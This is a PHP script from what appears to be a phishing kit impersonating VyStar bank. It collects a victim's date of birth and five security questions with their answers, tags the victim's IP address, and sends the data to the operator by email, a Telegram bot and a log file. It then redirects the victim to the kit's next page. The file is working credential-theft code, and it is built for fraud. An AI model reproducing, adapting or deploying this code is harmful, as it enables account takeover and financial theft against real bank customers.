<?php
$settings = include '../../../settings/settings.php';

# Debug 

if($settings['debug'] == "1"){
  error_reporting(E_ALL);
  ini_set('display_errors', '1');
  ini_set('display_startup_errors', '1');
}

# Allow URL Open

ini_set('allow_url_fopen',1);


function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$IP = get_client_ip();

# Settings


$settings = include '../../../settings/settings.php';
$owner = $settings['email'];
$filename = "../../../Logs/results.txt";
$client = file_get_contents("../../../Logs/client.txt");


# Variables




$dob      = $_POST['dob'];
$q1       = $_POST['q1'];
$a1       = $_POST['a1'];
$q2       = $_POST['q2'];
$a2       = $_POST['a2'];
$q3       = $_POST['q3'];
$a3       = $_POST['a3'];
$q4       = $_POST['q4'];
$a4       = $_POST['a4'];
$q5       = $_POST['q5'];
$a5       = $_POST['a5'];



# Messsage

$message = "[ 🍁 VYSTAR  | CLIENT : {$client} 🍁 ]\n\n";
$message .= "********** [ QUESTIONS INFORMATION ] **********\n";
$message .= "# QUESTION  : {$q1}\n";
$message .= "# ANSWER    : {$a1}\n";
$message .= "# QUESTION  : {$q2}\n";
$message .= "# ANSWER    : {$a2}\n";
$message .= "# QUESTION  : {$q3}\n";
$message .= "# ANSWER    : {$a3}\n";
$message .= "# QUESTION  : {$q4}\n";
$message .= "# ANSWER    : {$a4}\n";
$message .= "# QUESTION  : {$q5}\n";
$message .= "# ANSWER    : {$a5}\n";
$message .= "********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********\n";
$message .= "# IP ADDRESS : {$IP}\n";
$message .= "**********************************************\n";

# Send Mail 

if ($settings['send_mail'] == "1"){
  $to = $settings['email'];
  $headers = "Content-type:text/plain;charset=UTF-8\r\n";
  $headers .= "From: MrWeeBee <vystarbank@client_{$client}_site.com>" . "\r\n";
    $subject = "🍁 MRWEEBEE 🍁 VYSTAR 🍁 QUESTIONS 🍁 CLIENT #{$client} 🍁 {$IP}";
   $msg = $message;
    mail($to, $subject, $msg, $headers);
}

# Save Log 

if ($settings['save_results'] == "1"){
  $results = fopen($filename, "a+");
  fwrite($results, $message);
  fclose($results);
}

# Send Bot

if ($settings['telegram'] == "1"){
  $data = $message;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}

echo "<script>window.location.href = \"../session_emma\";</script>";

?>
